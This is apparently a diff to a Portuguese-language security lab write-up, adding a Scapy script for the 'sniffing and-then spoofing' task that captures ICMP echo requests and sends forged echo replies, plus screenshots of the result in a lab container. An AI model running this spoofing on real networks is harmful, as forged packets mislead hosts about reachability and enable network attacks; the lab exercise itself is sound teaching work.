@@ -100,7 +100,46 @@ Wireshark com as respostas e redirecionamentos
 
 ### Task 1.4 - Sniffing and-then Spoofing
 
+Código utilizado:
 
+```py
+#!/usr/bin/env python3
+
+from scapy.all import *
+
+def send_packet(pkt):
+
+	if(pkt[2].type == 8):
+		src=pkt[1].src
+		dst=pkt[1].dst
+		seq = pkt[2].seq
+		id = pkt[2].id
+		load=pkt[3].load
+
+		print(f"Flip: src {src} dst {dst} type 8 REQUEST")
+		print(f"Flop: src {dst} dst {src} type 0 REPLY\n")
+		reply = IP(src=dst, dst=src)/ICMP(type=0, id=id, seq=seq)/load
+		send(reply,verbose=0)
+
+interfaces = ['enp0s3','lo']
+pkt = sniff(iface=interfaces, filter='icmp', prn=send_packet)
+```
+
+Ping de 1.2.3.4 (sem resposta)
+
+![image](docs/images/Captura_de_ecrã_2023-12-22_233713.png)
+
+Ping de 1.2.3.4 (com resposta)
+
+![image](docs/images/Captura_de_ecrã_2023-12-22_233005.png)
+
+Execução no container seed-attacker:
+
+![image](docs/images/Captura_de_ecrã_2023-12-22_233019.png)
+
+Wireshark
+
+![image](docs/images/Captura_de_ecrã_2023-12-22_233217.png)
 
 # CTF  Find-my-TLS
 
